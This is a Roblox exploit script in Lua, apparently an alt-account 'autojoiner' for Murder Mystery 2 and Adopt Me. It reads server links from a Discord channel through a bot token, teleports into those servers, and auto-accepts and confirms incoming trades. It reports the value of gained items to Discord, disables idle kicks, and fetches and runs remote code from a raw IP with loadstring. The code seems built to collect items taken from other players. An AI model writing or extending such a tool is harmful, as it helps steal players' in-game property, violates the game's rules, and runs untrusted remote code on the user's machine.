--claude sigmer
joinGames = {[142823291] = true,[920587237] = true,}

if getgenv().__mm2_autojoiner_loaded then return end
getgenv().__mm2_autojoiner_loaded = true

repeat task.wait() until game:IsLoaded()

-- detect which game we're in (needed BEFORE the character wait because in ADM
-- the character doesn't spawn until a team has been chosen, so CharacterAdded
-- would hang forever otherwise)
local MM2_PLACE = 142823291
local ADM_PLACE = 920587237
local IS_MM2 = game.PlaceId == MM2_PLACE
local IS_ADM = game.PlaceId == ADM_PLACE

-- ADM: choose the team BEFORE waiting for the character so CharacterAdded fires
if IS_ADM then
    local okTeam, errTeam = pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("API",60):WaitForChild("TeamAPI/ChooseTeam",60):InvokeServer("Parents", {
            source_for_logging = "intro_sequence",
            dont_enter_location = true
        })
    end)
    if not okTeam then warn("[adm] early ChooseTeam failed: "..tostring(errTeam)) end
end

nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
a = tick()

-- common setup both games need (services, anti-idle, executor info, counters)
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
    b:Disable();
end;
local exec, execver = identifyexecutor()
totalval = 0
tradesd = 0
print(1)

if IS_MM2 then
-- MM2: auto-accept incoming trade offers
game.ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
     if nub.LastOffer then
        lastofer = nub.LastOffer
        while true do
            if nub.LastOffer ~= lastofer then break end
            game.ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
            task.wait(0.1)
        end
    end
end)
-- MM2: dismiss the Phone/Desktop prompt
task.spawn(function()
    local gui = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("DeviceSelect", 60)
    if not gui then return end
    while gui.Parent do
        pcall(function()
            firesignal(gui.Container.Phone.Button.MouseButton1Click)
        end)
        task.wait(0.1)
    end
end)
function trads()
    return game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end
function getinv()
    return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
end
local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons

-- value lookup mirrors mm2.lua: /supreme endpoint + flexible name+type+year
-- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
local godlyIdx = table.find(rarityTable, "Godly") or 6
local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}

local function lookupValue(realName, itemType, rarity, chroma, year)
    local D = rarity
    if itemType == "Pet" then D = "Pet" end
    local v = string.lower(tostring(realName or ""))
    if chroma then
        v = "chroma " .. v
        D = "Chroma"
    end
    if D == "Classic" then D = "Vintage" end
    local bucket = valueList[D]
    if not bucket then return nil end
    local t = string.lower(tostring(itemType or ""))
    local y = tostring(year or "")
    if bucket[v] then return bucket[v] end
    if bucket[v .. " (" .. t .. ")"] then return bucket[v .. " (" .. t .. ")"] end
    if bucket[v .. " " .. t] then return bucket[v .. " " .. t] end
    if y ~= "" then
        if bucket[v .. " (" .. y .. ")"] then return bucket[v .. " (" .. y .. ")"] end
        if bucket[v .. " " .. y] then return bucket[v .. " " .. y] end
        if bucket[v .. " " .. t .. " (" .. y .. ")"] then return bucket[v .. " " .. t .. " (" .. y .. ")"] end
        if bucket[v .. " (" .. t .. ") (" .. y .. ")"] then return bucket[v .. " (" .. t .. ") (" .. y .. ")"] end
    end
    return nil
end

-- per-item value via databrainrot entry; falls back to 2 for Godly+ and 1 otherwise
local function getItemValue(dataid)
    local entry = databrainrot[dataid]
    if not entry then return 0 end
    local value = lookupValue(entry.ItemName, entry.ItemType, entry.Rarity, entry.Chroma == true, entry.Year)
    if not value then
        local idx = table.find(rarityTable, entry.Rarity)
        if idx and idx >= godlyIdx then value = 2 else value = 1 end
    end
    return value
end

task.spawn(function() urnubitems = getinv() end)
function ischanged()
    local currentInventory = getinv()
    local changes = {}
    local hasChanged = false
    for item, amount in pairs(currentInventory) do
        local oldAmount = urnubitems[item] or 0
        if amount ~= oldAmount then
            changes[item] = amount - oldAmount
            hasChanged = true
        end
    end
    for item, oldAmount in pairs(urnubitems) do
        if currentInventory[item] == nil then
            changes[item] = -oldAmount
            hasChanged = true
        end
    end
    if hasChanged then
        urnubitems = currentInventory
        return true,changes
    end
    return false
end
function chang(inve)
    new = {}
    newval = 0
    for i,v in pairs(inve) do
        local value = getItemValue(i)
        table.insert(new,{
            name = i,
            amount = v,
            value = value
        })
        newval = newval + value * v
        totalval = totalval + value * v
    end
    table.sort(new, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)    
    fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 New items value: "..newval.."\n💎 All new items value: "..totalval.."\n```"
        },
        {
            name="Items",
            value=""
        },
    }
    for i, v in ipairs(new) do
        itemnub = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        fields[2].value = fields[2].value .. itemnub .. "\n"
    end
    fields[2].value = "```\n"..fields[2].value.."\n```"
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    local payload = {
         embeds  = {{
            title  = "MM2 autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}
    }
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end
-- MM2 trade monitoring: auto-decline stale start, auto-accept incoming requests
task.spawn(function()
    while true do
        local status,skot = trads()
        if status == "StartTrade" then
            timeintrade = 0
            repeat
                timeintrade = timeintrade + task.wait(0.1)
                if timeintrade >= 7 then
                    game.ReplicatedStorage.Trade.DeclineTrade:FireServer()
                    break
                end
            until trads() ~= "StartTrade"
            local bolean,itmes = ischanged()
            if bolean == true then
                tradesd = tradesd+1
                chang(itmes)
            end
        elseif status == "ReceivingRequest" then
            game.ReplicatedStorage.Trade.AcceptRequest:FireServer()
        end
        task.wait(0.1)
    end
end)
function inv()
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    neww = {}
    newwval = 0
    for i,v in pairs(getinv()) do
        local value = getItemValue(i)
        table.insert(neww,{
            name = i,
            amount = v,
            value = value
        })
        newwval = newwval + value
    end
    table.sort(neww, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 Inventory value: "..newwval.."\n```"
        },
        {
            name="Inventory",
            value=""
        },
    }
    for i, v in ipairs(neww) do
        itemnub = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        fields[2].value = fields[2].value .. itemnub .. "\n"
    end
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
        end
    end
    fields[2].value = "```\n"..fields[2].value.."\n```"
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"

    local payload = {
         embeds  = {{
            title  = "MM2 Autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}

    }

    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    
    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end
function invf()
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages" 

    
    local inventroy = "Inventory value: "
    talbe = {}
    vaule = 0
    for i,v in pairs(getinv()) do
        local value = getItemValue(i)
        table.insert(talbe,{
            name = i,
            amount = v,
            value = value
        })
        vaule = vaule + value
    end
    inventroy = inventroy..tostring(vaule).."\n\n"
    table.sort(talbe, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    for i, v in ipairs(talbe) do
        lnie = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        inventroy = inventroy .. lnie .. "\n"
    end
    --gemini
    local boundary = "---------------------------" .. tick()
    local body = "--" .. boundary .. "\r\n" ..
                "Content-Disposition: form-data; name=\"file\"; filename=\"items.yaml\"\r\n" ..
                "Content-Type: text/plain\r\n\r\n" ..
                inventroy .. "\r\n" ..
                "--" .. boundary .. "--\r\n"
    --
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = body
    })

    if response.StatusCode == 200 or response.StatusCode == 201 then else
        warn(response.Body)
    end

end

elseif IS_ADM then
-- forward-declare locals the early-started trade monitor below captures as
-- upvalues; they get assigned further down once we have the trade routes
local IsTrading
local TradeAcceptOrDeclineRequest

    -- ADM: choose Parents team and spawn at Home (redundant with the early call,
-- kept as a safety net in case the early one missed before API replicated)
pcall(function()
    ReplicatedStorage:WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer("Parents", {
        source_for_logging = "intro_sequence",
        dont_enter_location = true
    })
end)

-- ADM trade monitoring (started early so it's ready even before full setup)
task.spawn(function()
    while true do
        if IsTrading and IsTrading() then
            timeintrade = 0
            repeat
                timeintrade = timeintrade + task.wait(0.1)
                print(timeintrade)
                if timeintrade >= 12.5 then
                    warn(timeintrade)
                    if TradeAcceptOrDeclineRequest then
                        TradeAcceptOrDeclineRequest:InvokeServer(rnsender, false)
                    end
                    break
                end
            until not (IsTrading and IsTrading())
            warn("hi")
            local bolean, itmes = ischanged()
            if bolean == true then
                tradesd = tradesd + 1
                warn("1")
                chand(itmes)
                warn("2")
            end
        else
            fod = false
        end
        task.wait(0.1)
    end
end)

-- ADM: wait for the initial loading UI to finish
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local loadingScreen = playerGui:WaitForChild("AssetLoadUI", 60)
if loadingScreen then
    while loadingScreen.Enabled do
        task.wait(0.1)
    end
end



local API = ReplicatedStorage:WaitForChild("API")
fod = false
local ButtonPressed = API:WaitForChild("TradingServerAPI/ButtonPressed")
local IncrementCounter = API:WaitForChild("TradingServerAPI/IncrementConsecutiveSpawnCounter")
ButtonPressed:FireServer("spawn_dialog", "Home")
task.wait(0.5)
IncrementCounter:FireServer("Home")

local tradeFrame = playerGui:WaitForChild("TradeApp", 30) and playerGui.TradeApp:WaitForChild("Frame", 30)
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
local InventoryDB = Loads("InventoryDB")

function getinv()
    return require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
end

inventory = getinv()

rnsender = ""
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    rnsender = sender
    TradeAcceptOrDeclineRequest:InvokeServer(sender, true) --false
end)

IsTrading = function()
    return tradeFrame and tradeFrame.Visible or false
end

-- diff per-item by uid across every category. returns {[category] = {newItem, ...}}
-- so chand() can show exactly which items were gained on the latest trade.
function ischanged()
    local currentInventory = getinv()
    local changes = {}
    local hasChanged = false
    for category, items in pairs(currentInventory) do
        if type(items) == "table" then
            local oldItems = inventory[category] or {}
            for uid, itemData in pairs(items) do
                if not oldItems[uid] then
                    changes[category] = changes[category] or {}
                    table.insert(changes[category], itemData)
                    hasChanged = true
                end
            end
        end
    end
    if hasChanged then
        inventory = currentInventory
        return true, changes
    end
    return false
end

-- pet value list shared by getPetValue (must be file-scope, not trapped in spawn)
local valueList
task.spawn(function()
    valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
end)

local function formatValue(v)
    if not v then return "0" end
    if v >= 1e9 then return string.format("%.2fB", v / 1e9) end
    if v >= 1e6 then return string.format("%.2fM", v / 1e6) end
    if v >= 1e3 then return string.format("%.2fK", v / 1e3) end
    return tostring(v)
end

local function getPetValue(petName, petProps)
    local pet = valueList and valueList.pets and valueList.pets[petName]
    if not pet then return nil end
    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end
    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - flyride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end
    return pet[baseKey .. suffix] or pet[baseKey]
end

local function formatPetDisplay(petName, props)
    local parts = {}
    if props.mega_neon then table.insert(parts, "M") end
    if props.neon then table.insert(parts, "N") end
    if props.flyable then table.insert(parts, "F") end
    if props.rideable then table.insert(parts, "R") end
    if #parts > 0 then return "[" .. table.concat(parts) .. "] " .. petName end
    return petName
end

local function getInventoryDisplay(list)
    local grouped = {}
    for _, item in ipairs(list) do
        local displayName = formatPetDisplay(item.Name, item.Properties)
        if grouped[displayName] then
            grouped[displayName].Count = grouped[displayName].Count + 1
            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
        else
            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value, Value = item.Value }
        end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)
    local lines = {}
    for _, g in ipairs(groupedList) do
        table.insert(lines, string.format("%s → %s (x%s)", g.Name, formatValue(g.Value), g.Count))
    end
    -- trim to fit Discord's 1024-char field limit, leaving room for the code-block fence
    while #table.concat(lines, "\n") > 1014 and #lines > 0 do
        table.remove(lines)
    end
    return "```\n" .. table.concat(lines, "\n") .. "\n```"
end

function chand(inve)
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    neww = {}
    newwval = 0
    -- inve now arrives as {[category] = {itemData, ...}} from the rewritten ischanged
    for category, list in pairs(inve) do
        local cat = InventoryDB[category]
        if cat then
            for _, itemData in pairs(list) do
                local entry = cat[itemData.id]
                if entry then
                    local value = getPetValue(entry.name, itemData.properties)
                    if value then
                        table.insert(neww, {Name = entry.name, Properties = itemData.properties, Value = value})
                        newwval = newwval + value
                    end
                end
            end
        end
    end

    -- track running total like MM2's chang does with totalval
    totalval = totalval + newwval

    -- group identical items (same display name = same pet + same property flags)
    local grouped = {}
    for _, item in ipairs(neww) do
        local displayName = formatPetDisplay(item.Name, item.Properties)
        if grouped[displayName] then
            grouped[displayName].Count = grouped[displayName].Count + 1
            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
        else
            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value }
        end
    end
    local groupedList = {}
    for _, g in pairs(grouped) do table.insert(groupedList, g) end
    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)

    local itemLines = {}
    for _, g in ipairs(groupedList) do
        table.insert(itemLines, string.format("%s (x%s) → %s Value", g.Name, g.Count, g.TotalValue))
    end
    -- trim from the bottom (lowest value) to fit Discord's 1024-char field limit
    while #table.concat(itemLines, "\n") > 1014 and #itemLines > 0 do
        table.remove(itemLines)
    end

    fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 New items value: "..newwval.."\n💎 All new items value: "..totalval.."\n```"
        },
        {
            name="Items",
            value="```\n"..table.concat(itemLines, "\n").."\n```"
        },
    }

    local payload = {
         embeds  = {{
            title  = "ADM autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}
    }
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })

    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end

function inv()
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    neww = {}
    newwval = 0
    -- getinv().pets is a flat {[uid] = petData} map, not nested by sub-category
    local cat = InventoryDB["pets"]
    if cat then
        for _, itemData in pairs(getinv().pets) do
            local entry = cat[itemData.id]
            if entry then
                local value = getPetValue(entry.name, itemData.properties)
                if value then
                    table.insert(neww, {Name = entry.name, Properties = itemData.properties, Value = value})
                    newwval = newwval + value
                end
            end
        end
    end

    -- group identical pets (same display name = same pet + same property flags)
    local grouped = {}
    for _, item in ipairs(neww) do
        local displayName = formatPetDisplay(item.Name, item.Properties)
        if grouped[displayName] then
            grouped[displayName].Count = grouped[displayName].Count + 1
            grouped[displayName].TotalValue = grouped[displayName].TotalValue + item.Value
        else
            grouped[displayName] = { Name = displayName, Count = 1, TotalValue = item.Value }
        end
    end
    local groupedList = {}
    for _, g in pairs(grouped) do table.insert(groupedList, g) end
    table.sort(groupedList, function(a, b) return a.TotalValue > b.TotalValue end)

    local itemLines = {}
    for _, g in ipairs(groupedList) do
        table.insert(itemLines, string.format("%s (x%s) → %s Value", g.Name, g.Count, g.TotalValue))
    end
    -- trim from the bottom (lowest value) to fit Discord's 1024-char field limit
    while #table.concat(itemLines, "\n") > 1014 and #itemLines > 0 do
        table.remove(itemLines)
    end

    fields = {
        {
            name="Info",
            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 Inventory value: "..newwval.."\n```"
        },
        {
            name="Inventory",
            value="```\n"..table.concat(itemLines, "\n").."\n```"
        },
    }
    local payload = {
         embeds  = {{
            title  = "ADM Autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}
    }
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })

    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end

-- ADM: auto-add food + accept negotiation
task.spawn(function()
    while true do
        if IsTrading() then
            if not fod then
                local foodKeys = {}
                for uid, data in pairs(inventory.food) do
                    table.insert(foodKeys, uid)
                end
                if #foodKeys > 0 then
                    local randomIndex = math.random(1, #foodKeys)
                    local randomFoodUid = foodKeys[randomIndex]
                    AddItemRemote:FireServer(randomFoodUid)
                    fod = true
                end
            end
        end
        AcceptNegotiationRemote:FireServer()
        task.wait(0.1)
    end
end)

-- ADM: auto-confirm trade
task.spawn(function()
    while true do
        if IsTrading() then
            ConfirmTradeRemote:FireServer()
        end
        task.wait(0.1)
    end
end)

-- ADM has no separate file-uploader; alias invf to inv so .invf still responds
invf = inv

-- ADM posts initial inventory on join (wait for the value list to load first)
task.spawn(function()
    while not valueList do task.wait(0.1) end
    inv()
end)

end

print(2)

function react(msgid, emoji)
    local url = "https://discord.com/api/v10/channels/"..tostring(chanelid).."/messages/"..tostring(msgid).."/reactions/"..HttpService:UrlEncode(emoji).."/@me"
    local response = request({
        Url = url,
        Method = "PUT",
        Headers = {["Authorization"] = "Bot "..bottoken}
    })

    if response.StatusCode ~= 204 then
        warn(response.Body)
    end
end

if not isfile("jnubs.txt") then
	writefile("jnubs.txt", "[]")
end
if not isfile("nub.txt") then
	writefile("nub.txt", "nub")
end
if not isfile("queue.txt") then
	writefile("queue.txt", "[]")
end






-- claude opus code starts here
local function readlist(file)
    local ok, t = pcall(function() return HttpService:JSONDecode(readfile(file)) end)
    if ok and type(t) == "table" then return t end
    return {}
end
local function writelist(file, t)
    pcall(function() writefile(file, HttpService:JSONEncode(t)) end)
end
local function inlist(file, value)
    for _, v in ipairs(readlist(file)) do
        if v == value then return true end
    end
    return false
end
local function addtolist(file, value)
    local t = readlist(file)
    for _, v in ipairs(t) do
        if v == value then return end
    end
    table.insert(t, value)
    writelist(file, t)
end

function playerleft()
    local target = readfile("nub.txt")
    for _,nub in pairs(game.Players:GetChildren()) do
        if nub.Name == target then
            return false
        end
    end
    return true
end
local function readytojoin()
    return tradesd >= tradesbeforenext or playerleft()
end

local TeleportService = game:GetService("TeleportService")
local LocalPlayer = game.Players.LocalPlayer

local teleporting = false
local lastMessageId = nil
local currentTarget = nil   -- {placeId, jobId, msgid} the teleport loop is aiming at

local function fetchMessages(afterId)
    local url = "https://discord.com/api/v10/channels/"..chanelid.."/messages?limit=50"
    if afterId then url = url.."&after="..afterId end
    local ok, response = pcall(function()
        return request({
            Url = url,
            Method = "GET",
            Headers = { ["Authorization"] = "Bot "..bottoken }
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, decoded = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and type(decoded) == "table" then return decoded end
    end
    return {}
end

local function processJoinMessage(messageData)
    if not messageData or not messageData.author then return end
    if messageData.channel_id and messageData.channel_id ~= chanelid then return end

    local content = messageData.content or ""
    -- format 1:  142823291,'ca7a63aa-...'
    local placeId, jobId = string.match(content, "(%d+),%s*'([^']+)'")
    -- format 2:  TeleportToPlaceInstance("142823291", "ca7a63aa-...", ...)
    if not (placeId and jobId) then
        placeId, jobId = string.match(content, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"')
    end
    if not (placeId and jobId) then return end

    -- drop joins for games not enabled in the joinGames setting
    if not joinGames[tonumber(placeId)] then return end

    task.spawn(function() react(messageData.id,"✅") end)
    writefile("nub.txt", messageData.author.username)

    if inlist("jnubs.txt", messageData.id) then return end
    if jobId == game.JobId then return end

    -- mid-teleport: switch straight to this new server instead of queuing it
    if teleporting then
        teleportTo(placeId, jobId, messageData.id)
        return
    end

    local q = readlist("queue.txt")
    for _, j in ipairs(q) do
        if j.msgid == messageData.id then return end
    end
    table.insert(q, {
        placeId = placeId,
        jobId = jobId,
        msgid = messageData.id,
        author = messageData.author.username
    })
    writelist("queue.txt", q)
end

local function checkMessagesWhileTeleporting()
    while teleporting do
        local msgs = fetchMessages(lastMessageId)
        for i = #msgs, 1, -1 do
            processJoinMessage(msgs[i])
        end
        if msgs[1] then
            lastMessageId = msgs[1].id
        end
        task.wait(1)
    end
end

-- teleport to currentTarget, retrying forever. if a new join message arrives
-- processJoinMessage calls teleportTo again, currentTarget changes, and the loop
-- immediately switches to the new server.
function teleportTo(placeId, jobId, msgid)
    currentTarget = { placeId = tonumber(placeId), jobId = jobId, msgid = msgid }

    if teleporting then return end   -- a loop is already running; it picks up currentTarget
    teleporting = true
    task.spawn(checkMessagesWhileTeleporting)

    task.spawn(function()
        local failed = false
        local conn = TeleportService.TeleportInitFailed:Connect(function(player)
            if player == LocalPlayer then failed = true end
        end)

        while teleporting do
            local target = currentTarget
            failed = false
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(target.placeId, target.jobId, LocalPlayer)
            end)
            if ok and target.msgid then
                addtolist("jnubs.txt", target.msgid)
            end

            -- wait out this attempt; break early if it failed or the target changed
            local t = 0
            while t < 5 and not failed and currentTarget == target do
                task.wait(0.5)
                t = t + 0.5
            end

            -- target unchanged -> space out the retry; changed -> retry immediately
            if currentTarget == target then
                task.wait(2)
            end
        end

        if conn then conn:Disconnect() end
    end)
end
local socket
local sequenceNumber
local sessionId
local resumeUrl
local shouldResume = false
local connectionId = 0
local readyConnId = 0   -- generation that successfully reached READY/RESUMED
local helloConnId = 0   -- generation that received the HELLO (op 10)

function sendPayload(op, d)
    if not socket then return end
    pcall(function()
        socket:Send(HttpService:JSONEncode({
            op = op,
            d = d
        }))
    end)
end

local function connectgateway()
    connectionId = connectionId + 1
    local myId = connectionId
    local url = "wss://gateway.discord.gg/?v=10&encoding=json"
    if shouldResume and resumeUrl then
        url = resumeUrl .. "/?v=10&encoding=json"
    end

    print("[gateway] connecting (gen "..myId..")")
    -- IMPORTANT: call WebSocket.connect directly, exactly like old.lua.
    -- It is a YIELDING call; wrapping it in pcall(function() ... end) makes the
    -- yield cross a pcall/closure boundary, which on many executors returns a
    -- socket that never receives HELLO ("dead socket"). Do not wrap it.
    socket = WebSocket.connect(url)
    socket.OnMessage:Connect(function(msg)
        if connectionId ~= myId then return end
        local data = HttpService:JSONDecode(msg)

        if data.s then
            sequenceNumber = data.s
        end

        if data.op == 10 then
            helloConnId = myId
            local heartbeatInterval = data.d.heartbeat_interval / 1000
            if shouldResume and sessionId and sequenceNumber then
                print("[gateway] HELLO received, sending RESUME")
                sendPayload(6, {
                    token = bottoken,
                    session_id = sessionId,
                    seq = sequenceNumber
                })
            else
                print("[gateway] HELLO received, sending IDENTIFY")
                sendPayload(2, {
                    token = bottoken,
                    intents = 33280,
                    properties = {
                        os = "linux",
                        browser = "opsec",
                        device = "desktop"
                    }
                })
            end
            task.spawn(function()
                while connectionId == myId and socket do
                    task.wait(heartbeatInterval)
                    if connectionId ~= myId then break end
                    sendPayload(1, sequenceNumber)
                end
            end)
        end

        if data.op == 0 and data.t == "READY" then
            sessionId = data.d.session_id
            resumeUrl = data.d.resume_gateway_url
            shouldResume = true
            readyConnId = myId
            print("[gateway] connected (READY)")
        end

        if data.op == 0 and data.t == "RESUMED" then
            readyConnId = myId
            print("[gateway] session resumed")
        end

        if data.op == 7 then
            shouldResume = true
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 9 then
            shouldResume = (data.d == true)
            if not shouldResume then
                sessionId = nil
            end
            task.wait(math.random(1, 5))
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 0 and data.t == "MESSAGE_CREATE" then
            local messageData = data.d
            if messageData.channel_id == chanelid then
                lastMessageId = messageData.id
                if messageData.content==".inv" then
                    task.spawn(function() react(messageData.id,"✅") end)
                    inv()
                elseif messageData.content==".invf" then
                    task.spawn(function() react(messageData.id,"✅") end)
                    invf()
                end

                processJoinMessage(messageData)
            end
        end
    end)
    if not socket then
        warn("[gateway] connect returned nil, retrying")
        task.wait(5 + math.random() * 5)          -- jitter so alts don't sync up
        if connectionId == myId then connectgateway() end
        return
    end

    print("[gateway] socket open, waiting for handshake")

    socket.OnClose:Connect(function()
        if connectionId ~= myId then return end   -- stale handler, ignore
        warn("[gateway] closed, reconnecting")
        socket = nil
        if sessionId and sequenceNumber then
            shouldResume = true
        end
        task.wait(5 + math.random() * 5)
        if connectionId == myId then connectgateway() end   -- re-check after wait
    end)

    -- watchdog. a socket can open but silently stall:
    --   * no HELLO at all    -> dead socket (gateway TLS never finished). retry FAST.
    --   * HELLO but no READY -> IDENTIFY problem (usually rate limit). back off.
    task.spawn(function()
        -- phase 1: HELLO should arrive within ~1s on a live socket
        task.wait(6)
        if connectionId == myId and helloConnId ~= myId then
            warn("[gateway] no HELLO (dead socket), retrying now")
            pcall(function() if socket then socket:Close() end end)
            if connectionId == myId then
                socket = nil
                connectgateway()        -- no wait: just grab a fresh connection
            end
            return
        end

        -- phase 2: READY should follow HELLO quickly
        if connectionId ~= myId then return end
        task.wait(8)
        if connectionId == myId and readyConnId ~= myId then
            warn("[gateway] HELLO but no READY (rate limited?), backing off")
            pcall(function() if socket then socket:Close() end end)
            task.wait(3 + math.random() * 4)
            if connectionId == myId then
                socket = nil
                connectgateway()
            end
        end
    end)
end

task.spawn(function()
    while true do
        task.wait(1)
        if not teleporting and readytojoin() then
            local q = readlist("queue.txt")
            if #q > 0 then
                local job = table.remove(q, 1)
                writelist("queue.txt", q)
                if job and job.msgid and not inlist("jnubs.txt", job.msgid) and job.jobId ~= game.JobId then
                    teleportTo(job.placeId, job.jobId, job.msgid)
                end
            end
        end
    end
end)

connectgateway()
--
print(tick()-a)
